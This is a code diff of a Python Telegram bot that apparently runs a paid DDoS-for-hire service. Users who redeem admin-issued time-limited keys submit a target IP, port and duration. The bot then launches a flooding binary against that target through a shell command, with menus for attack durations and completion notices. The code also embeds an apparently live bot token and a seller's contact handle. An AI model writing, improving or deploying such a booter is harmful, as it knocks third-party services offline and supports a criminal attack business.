@@ -1,201 +1,259 @@
-import os
-import json
-import time
-import random
-import string
 import telebot
-import datetime
-import calendar
-import subprocess
-import threading
-from telebot import types
-from dateutil.relativedelta import relativedelta
+import logging
+import asyncio
+import time
+import json
+from datetime import datetime, timedelta
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+from threading import Thread
 
-# Telegram bot token
-bot = telebot.TeleBot('8134663359:AAEBnY-0SxdQUwiTYPfWoTEyUhx-pJjfcoQ')
+# Configuration
+TOKEN = '8134663359:AAEBnY-0SxdQUwiTYPfWoTEyUhx-pJjfcoQ'  # Replace with your Bot's token
+ADMIN_IDS = [5879359815]  # Replace with your Telegram User ID
+USERNAME = "@itzmd808sahilSELLER"  # Replace with your bot's username
+REQUEST_INTERVAL = 1  # Interval for the asyncio loop
+USERS_FILE = 'users.json'
+KEYS_FILE = 'keys.json'
+ONGOING_ATTACKS = {}
 
-admin_id = {"5879359815", "5879359815"}
+# Initialize Bot
+bot = telebot.TeleBot(TOKEN)
+logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)
 
-USER_FILE = "users.json"
-LOG_FILE = "log.txt"
-KEY_FILE = "keys.json"
+# Variables
+attack_in_progress = False
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
-MAX_chudai_TIME = 300
+# Load or Initialize Data
+try:
+    with open(USERS_FILE, 'r') as f:
+        users = json.load(f)
+except FileNotFoundError:
+    users = []
 
-users = {}
-keys = {}
-last_chudai_time = {}
+try:
+    with open(KEYS_FILE, 'r') as f:
+        keys = json.load(f)
+except FileNotFoundError:
+    keys = {}
 
-def load_data():
-    global users, keys
-    users = read_users()
-    keys = read_keys()
+# Save Helper Function
+def save_file(file_name, data):
+    with open(file_name, 'w') as f:
+        json.dump(data, f, indent=4)  # Save with indentation
 
-def read_users():
-    try:
-        with open(USER_FILE, "r") as file:
-            return json.load(file)
-    except FileNotFoundError:
-        return {}
+# Async Loop
+loop = asyncio.get_event_loop()
 
-def read_keys():
-    try:
-        with open(KEY_FILE, "r") as file:
-            return json.load(file)
-    except FileNotFoundError:
-        return {}
+async def start_asyncio_loop():
+    while True:
+        await asyncio.sleep(REQUEST_INTERVAL)
 
-def save_users():
-    with open(USER_FILE, "w") as file:
-        json.dump(users, file)
-
-def save_keys():
-    with open(KEY_FILE, "w") as file:
-        json.dump(keys, file)
-
-def create_random_key():
-    key = "KINGBHAI-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
-    keys[key] = {"status": "valid"}
-    save_keys()
-    return key
-
-def log_command(user_id, target, port, chudai_time):
-    try:
-        user_info = bot.get_chat(user_id)
-        username = user_info.username if user_info.username else f"UserID: {user_id}"
-    except Exception:
-        username = f"UserID: {user_id}"
-
-    with open(LOG_FILE, "a") as file:
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {chudai_time}\n\n")
-
-def clear_logs():
-    try:
-        with open(LOG_FILE, "w") as file:
-            file.truncate(0)
-        return "Logs cleared ✅"
-    except FileNotFoundError:
-        return "No data found."
-
-@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
-def redeem_key(message):
-    bot.reply_to(message, "🔑 Please enter your key:")
-    bot.register_next_step_handler(message, process_redeem_key)
-
-def process_redeem_key(message):
-    key = message.text.strip()
-    if key in keys and keys[key]["status"] == "valid":
-        keys[key]["status"] = "redeemed"
-        save_keys()
-        users[str(message.chat.id)] = (datetime.datetime.now() + relativedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
-        save_users()
-        bot.reply_to(message, "✅ Key Redeemed Successfully! You now have access.")
-    else:
-        bot.reply_to(message, "📛 Invalid or Expired Key 📛")
-
-@bot.message_handler(func=lambda message: message.text == "📜 Users")
-def list_users(message):
-    user_id = str(message.chat.id)
-    if user_id not in admin_id:
-        bot.reply_to(message, "⛔ Access Denied: Admins only.")
-        return
-    if not users:
-        bot.reply_to(message, "⚠ No users found.")
-        return
-    response = "✅ *Registered Users* ✅\n\n" + "\n".join([f"🆔 {user}" for user in users])
-    bot.reply_to(message, response, parse_mode='Markdown')
-
-@bot.message_handler(commands=['start'])
-def start_command(message):
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    chudai_button = types.KeyboardButton("🚀 chudai")
-    myinfo_button = types.KeyboardButton("👤 My Info")
-    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
-    bot_sitting_button = types.KeyboardButton("🤖 BOT SITTING")
-    admin_panel_button = types.KeyboardButton("🔧 ADMIN_PANEL")
-    if str(message.chat.id) in admin_id:
-        markup.add(admin_panel_button)
-    markup.add(chudai_button, myinfo_button, redeem_button,  bot_sitting_button)
-    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦!", reply_markup=markup)
-
-# ... (keep all other handlers unchanged, same as your original code) ...
-
-# Your chudai handler with a try-except to prevent crash
-@bot.message_handler(func=lambda message: message.text == "🚀 chudai")
-def handle_chudai(message):
-    user_id = str(message.chat.id)
-    try:
-        if user_id in users and users[user_id]:
-            expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
-            if datetime.datetime.now() > expiration:
-                bot.reply_to(message, "❗ Your access has expired. Contact the admin to renew ❗")
-                return
-        else:
-            bot.reply_to(message, "⛔️ Unauthorized Access! ⛔️")
-            return
-
-        # Cooldown check
-        if user_id in last_chudai_time:
-            time_since = (datetime.datetime.now() - last_chudai_time[user_id]).total_seconds()
-            if time_since < 0:  # Edge case fix, negative delta
-                time_since = 0
-            if time_since < 0:  # Just safe check again
-                time_since = 0
-            COOLDOWN_PERIOD = 0
-            if time_since < COOLDOWN_PERIOD:
-                remaining = COOLDOWN_PERIOD - time_since
-                bot.reply_to(message, f"⌛ Cooldown active. Wait {int(remaining)} seconds.")
-                return
-
-        bot.reply_to(message, "Enter target ip, port and duration (seconds) separated by space")
-        bot.register_next_step_handler(message, process_chudai_details)
-    except Exception as e:
-        bot.reply_to(message, "⚠️ Error occurred. Try again later.")
-        print(f"Error in handle_chudai: {e}")
-
-def process_chudai_details(message):
-    user_id = str(message.chat.id)
-    details = message.text.split()
-    if len(details) != 3:
-        bot.reply_to(message, "Invalid format. Use: ip port duration")
-        return
-    target = details[0]
-    try:
-        port = int(details[1])
-        chudai_time = int(details[2])
-        if chudai_time > MAX_chudai_TIME:
-            bot.reply_to(message, f"Max allowed time is {MAX_chudai_TIME} seconds.")
-            return
-        log_command(user_id, target, port, chudai_time)
-        command = f"./smokey {target} {port} {chudai_time} 1000"
-        subprocess.Popen(command, shell=True)
-        last_chudai_time[user_id] = datetime.datetime.now()
-        bot.reply_to(message, f"Attack sent to {target}:{port} for {chudai_time} seconds.")
-        threading.Timer(chudai_time, send_chudai_finished_message, [message.chat.id, message.message_id, target, port, chudai_time]).start()
-    except Exception as e:
-        bot.reply_to(message, "Invalid port or time.")
-        print(f"Error in process_chudai_details: {e}")
-
-def send_chudai_finished_message(chat_id, message_id, target, port, chudai_time):
-    message = (
-        f"🔥 chudai COMPLETED! 🔥\n\n"
-        f"🎯 TARGET: {target}:{port}\n"
-        f"⏳ DURATION: {chudai_time} SECONDS\n"
-        f"💀 STATUS: SUCCESS!\n\n"
-        f"💀 MISSION SUCCESS!"
+# Notify Admin After Attack Completion
+def notify_attack_finished(target_ip, target_port, duration):
+    bot.send_message(
+        ADMIN_IDS[0],
+        f"✅ *𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀* ✅\n\n"
+        f"🎯 𝙏𝘼𝙍𝙂𝙀𝙏-> {target_ip}\n"
+        f"💣 𝙋𝙊𝙍𝙏-> {target_port}\n"
+        f"⏳ 𝙏𝙄𝙈𝙀-> {duration}\n\n"
+        f"🚀 𝙁𝙀𝙀𝙙𝙗𝙖𝙘𝙠 𝚂𝙀𝙉𝘿-> {USERNAME}",
+        parse_mode='Markdown'
     )
+
+# Async Attack Execution
+async def run_attack_command_async(target_ip, target_port, duration):
+    global attack_in_progress
+    attack_in_progress = True
+
     try:
-        bot.send_message(chat_id, message, reply_to_message_id=message_id)
+        process = await asyncio.create_subprocess_shell(
+            f"./smokey {target_ip} {target_port} {duration} 1300",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
+
+        if stdout:
+            logging.info(f"❌ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙀𝙍𝙍𝙊𝙍-> {stdout.decode().strip()}")
+        if stderr:
+            logging.error(f"❌ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙀𝙍𝙍𝙊𝙍-> {stderr.decode().strip()}")
     except Exception as e:
-        print(f"Error sending completion message: {e}")
+        logging.error(f"❌ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙀𝙍𝙍𝙊𝙍-> {e}")
+    finally:
+        attack_in_progress = False
+        notify_attack_finished(target_ip, target_port, duration)
 
-# Similar try-except can be added to other handlers if needed...
+@bot.message_handler(func=lambda msg: msg.text == "⬅️ BACK")
+@bot.message_handler(commands=['start'])
+def back_to_main_menu(message):
+    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)
+    options = ["🚀 START ATTACK", "🔍 ACCOUNT", "🔑 REDEEM KEY", "🔐 GENKEY", "🛑 STOP ATTACK"]
+    buttons = [KeyboardButton(option) for option in options]
+    markup.add(*buttons)
 
+    bot.send_message(
+        message.chat.id,
+        f"🔥 *𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙋𝙍𝙄𝙈𝙐𝙈 𝙐𝙎𝙀𝙍*🔥\n"
+        f"*𝘽𝙔 𝙏𝙊 𝘿𝙈*-> {USERNAME}",
+        reply_markup=markup,
+        parse_mode='Markdown'
+    )
+
+# Command: Generate Custom Key
+@bot.message_handler(func=lambda msg: msg.text == "🔐 GENKEY")
+def gen_custom_key_command(message):
+    if message.from_user.id not in ADMIN_IDS:
+        bot.send_message(message.chat.id, "🚫 𝙀𝙍𝙍𝙊𝙍 🚫")
+        return
+    bot.send_message(message.chat.id, "✅ 𝙐𝙎𝙀-> 𝙔𝙊𝙐𝙍 𝙉𝘼𝙈𝙀 30 𝙙𝙖𝙮𝙨")
+    bot.register_next_step_handler(message, process_custom_key_generation)
+
+def process_custom_key_generation(message):
+    try:
+        args = message.text.split()
+        if len(args) != 3 or not args[1].isdigit():
+            raise ValueError("❌ 𝙐𝙎𝙀-> 𝙔𝙊𝙐𝙍 𝙉𝘼𝙈𝙀 30 𝙙𝙖𝙮𝙨")
+
+        key_name, time_amount, time_unit = args[0], int(args[1]), args[2].lower()
+        if time_unit not in ['hours', 'days']:
+            raise ValueError("Invalid time unit. Use 'hours' or 'days'.")
+
+        expiry = datetime.now() + (timedelta(hours=time_amount) if time_unit == 'hours' else timedelta(days=time_amount))
+        keys[key_name] = {"expiry": expiry.isoformat(), "redeemed": False}
+        save_file(KEYS_FILE, keys)
+
+        bot.send_message(message.chat.id, f"🔑 𝙂𝙀𝙉𝙆𝙀𝙔-> `{key_name}`\n⏳ 𝙑𝘼𝙇𝙄𝘿𝙄𝙏𝙔->  {expiry}", parse_mode='Markdown')
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {str(e)}")
+
+# Command: Redeem Key
+@bot.message_handler(func=lambda msg: msg.text == "🔑 REDEEM KEY")
+def redeem_key_command(message):
+    bot.send_message(message.chat.id, "🔑 𝙀𝙉𝙏𝙀𝙍 𝙆𝙀𝙔")
+    bot.register_next_step_handler(message, process_key_redeem)
+
+def process_key_redeem(message):
+    user_id = message.from_user.id
+    key = message.text.strip()
+
+    if any(user['user_id'] == user_id for user in users):
+        bot.send_message(message.chat.id, "🚫 𝙀𝙍𝙍𝙊𝙍 🚫")
+        return
+
+    if key not in keys or keys[key]["redeemed"]:
+        bot.send_message(message.chat.id, "🚫 𝙀𝙍𝙍𝙊𝙍 🚫")
+        return
+
+    keys[key]["redeemed"] = True
+    expiry = keys[key]["expiry"]
+    users.append({"user_id": user_id, "username": message.from_user.username, "expiry": expiry})
+    save_file(KEYS_FILE, keys)
+    save_file(USERS_FILE, users)
+
+    bot.send_message(message.chat.id, f"🔑 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 𝙆𝙀𝙔 𝙍𝙀𝘿𝙀𝙀𝙈\n𝙑𝘼𝙇𝙄𝘿𝙄𝙏𝙔-> {expiry}")
+
+# Command: Start Attack
+@bot.message_handler(func=lambda msg: msg.text == "🚀 START ATTACK")
+def attack_command(message):
+    if not any(user['user_id'] == message.from_user.id for user in users):
+        bot.send_message(message.chat.id, f"🔑 𝙉𝙊 𝘼𝙋𝙋𝙍𝙊𝙑𝘼𝙇 𝘽𝙀𝙔 𝙏𝙊 𝘿𝙈-> {USERNAME}")
+        return
+
+    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)
+    time_plans = ["1 MIN", "2 MIN", "3 MIN", "4 MIN", "5 MIN"]
+    buttons = [KeyboardButton(plan) for plan in time_plans]
+    markup.add(*buttons)
+    back_button = KeyboardButton("⬅️ BACK")
+    markup.add(back_button)
+
+    bot.send_message(
+        message.chat.id,
+        "⏳ Choose an attack time plan:\n\n"
+        "ATTACK TIME",
+        reply_markup=markup
+    )
+
+# Process Time Plan Selection
+@bot.message_handler(func=lambda msg: msg.text in ["1 MIN", "2 MIN", "3 MIN", "4 MIN", "5 MIN"])
+def handle_time_plan_selection(message):
+    time_plan_map = {
+        "1 MIN": 60,
+        "2 MIN": 120,
+        "3 MIN": 180,
+        "4 MIN": 240,
+        "5 MIN": 300
+    }
+
+    selected_time = time_plan_map.get(message.text)
+
+    if selected_time:
+        bot.send_message(message.chat.id, f"🚀 𝙐𝙎𝘼𝙂𝙀-> 𝙄𝙋 𝙋𝙊𝙍𝙏")
+        bot.register_next_step_handler(message, process_attack_with_time_plan, selected_time)
+
+# Process Attack with Time Plan
+def process_attack_with_time_plan(message, selected_time):
+    args = message.text.split()
+    if len(args) != 2:
+        bot.send_message(message.chat.id, "🚀 𝙐𝙎𝘼𝙂𝙀-> 𝙄𝙋 𝙋𝙊𝙍𝙏")
+        return
+
+    try:
+        target_ip, target_port = args[0], int(args[1])
+
+        if target_port in blocked_ports:
+            bot.send_message(message.chat.id, f"🚫 𝙄𝙋 𝙋𝙊𝙍𝙏 𝘽𝙇𝙊𝘾𝙆𝙀𝘿 {target_port}")
+            return
+
+        if message.chat.id in ONGOING_ATTACKS:
+            bot.send_message(message.chat.id, "🚫 𝙀𝙍𝙍𝙊𝙍 🚫")
+            return
+
+        ONGOING_ATTACKS[message.chat.id] = (target_ip, target_port, selected_time)
+
+        asyncio.run_coroutine_threadsafe(
+            run_attack_command_async(target_ip, target_port, selected_time), loop
+        )
+        bot.send_message(message.chat.id, f"🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 🚀\n\n🎯 𝙏𝘼𝙍𝙂𝙀𝙏-> {target_ip}\n💣 𝙋𝙊𝙍𝙏->{target_port}\n⏳ 𝙏𝙄𝙈𝙀-> {selected_time}\n\n🚀 𝘽𝙔 𝙏𝙊 𝘿𝙈-> {USERNAME}")
+    except ValueError:
+        bot.send_message(message.chat.id, "🚫 𝙀𝙍𝙍𝙊𝙍 🚫")
+
+# Stop Attack Command
+@bot.message_handler(func=lambda msg: msg.text == "🛑 STOP ATTACK")
+def stop_attack_command(message):
+    if message.chat.id in ONGOING_ATTACKS:
+        del ONGOING_ATTACKS[message.chat.id]
+        bot.send_message(message.chat.id, "🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑")
+    else:
+        bot.send_message(message.chat.id, "❌ 𝙉𝙊 𝘼𝙏𝙏𝘼𝘾𝙆 𝙏𝙊 𝙎𝙏𝙊𝙋 ❌")
+
+# Account Status Command
+@bot.message_handler(func=lambda msg: msg.text == "🔍 ACCOUNT")
+def handle_status_report(message):
+    user = next((user for user in users if user['user_id'] == message.from_user.id), None)
+    if user:
+        response = (
+            f"💰 𝙔𝙊𝙐𝙍 𝘼𝘾𝘾𝙊𝙐𝙉𝙏\n"
+            f"👤 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀-> @{user['username']}\n"
+            f"⏳ 𝙑𝘼𝙇𝙄𝘿𝙄𝙏𝙔-> {user['expiry']}\n\n"
+            f"🚀 𝘽𝙔 𝙏𝙊 𝘿𝙈-> {USERNAME}"
+        )
+    else:
+        response = "🚫 𝙀𝙍𝙍𝙊𝙍 🚫"
+    bot.send_message(message.chat.id, response, parse_mode='Markdown')
+
+# Async Loop Initialization
+def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(start_asyncio_loop())
+
+# Main Execution
 if __name__ == "__main__":
-    load_data()
+    Thread(target=start_asyncio_thread, daemon=True).start()
+    logging.info("🚀 KING OF GOD😎")
     while True:
         try:
             bot.polling(none_stop=True)
         except Exception as e:
-            print(f"Polling error: {e}")
-            time.sleep(5)  # Wait 5 sec before restarting polling
+            logging.error(f"Polling error: {e}")
+            time.sleep(5)
